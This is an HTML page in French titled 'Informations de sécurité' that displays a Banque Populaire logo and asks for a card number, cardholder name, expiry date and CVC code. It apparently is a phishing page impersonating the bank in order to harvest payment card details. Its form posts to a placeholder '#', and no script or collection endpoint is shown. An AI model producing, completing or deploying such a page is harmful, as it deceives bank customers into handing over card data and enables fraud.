<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informations de sécurité</title>
    <style>
        body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: linear-gradient(to bottom, #020b6cd0, #175dd6d0);
    color: #333;
}

.header {
    background: linear-gradient(to bottom, #175dd6d0, #020b6cd0);
    color: white;
    padding: 8px;
    text-align: center;
    font-size: 20px;
}

.header img {
    float: left;
    height: 50px;
}

.main-content {
    background-color: #f8f9fa;
    margin: 10px;
    padding: 20px;
    text-align: center;
}

.form-group {
    margin-bottom: 10px;
}

.form-group label {
    display: block;
    margin-bottom: 5px;
    font-weight: bold;
    color: rgb(0, 1, 73);
}

.form-group input {
    width: 100%;
    padding: 8px;
    font-size: 16px;
    color: #333;
    background-color: #f8f9fa;
    border: 1px solid #ddd;
}

.form-group input:focus {
    border-color: #0015ffd0;
    outline: none;
}

.form-group button {
    padding: 10px 20px;
    background-color: #0056b3;
    color: rgb(0, 1, 73);
    border: none;
    cursor: pointer;
    font-size: 16px;
    color: rgb(0, 2, 30);
}

.form-group button:hover {
    background-color: #003388;
}

.footer {
    background: linear-gradient(to bottom, #020b6cd0, #175dd6d0);
    color: rgb(0, 1, 73);
    padding: 10px;
    text-align: center;
    font-size: 14px;
}

.footer a {
    color: rgb(0, 1, 73);
    text-decoration: none;
    margin-right: 10px;
}

.footer a:hover {
    color: #020b6cd0;
    text-decoration: underline;
}
</style>
</head>
<body>
    <div class="header">
        <img src="Banque-PopulaireLogo.jpg" alt="La Banque populaire" width ="50" height="200">
        <h1>Informations de sécurité</h1>
    </div>
    <div class="main-content">
        <form action="#" method="post">
            <div class="form-group">
                <label for="card-number">Numéro de carte bancaire</label>
                <input type="text" id="card-number" name="card-number" required>
            </div>
            <div class="form-group">
                <label for="cardholder">Nom du titulaire</label>
                <input type="text" id="cardholder" name="cardholder" required>
            </div>
            <div class="form-group">
                <label for="expiration-date">Date d'expiration (MM/AA)</label>
                <input type="text" id="expiration-date" name="expiration-date" required>
            </div>
            <div class="form-group">
                <label for="cvc">Code CCV/CVC</label>
                <input type="text" id="cvc" name="cvc" required>
            </div>
            <div class="form-group">
                <button type="submit">Enregistrer</button>
            </div>
        </form>
    </div>
    <div class="footer">
        <a href="#">Contactez-nous</a>
        <a href="#">En savoir plus</a>
        <a href="#">Votre compte</a>
    </div>
</body>
</html>
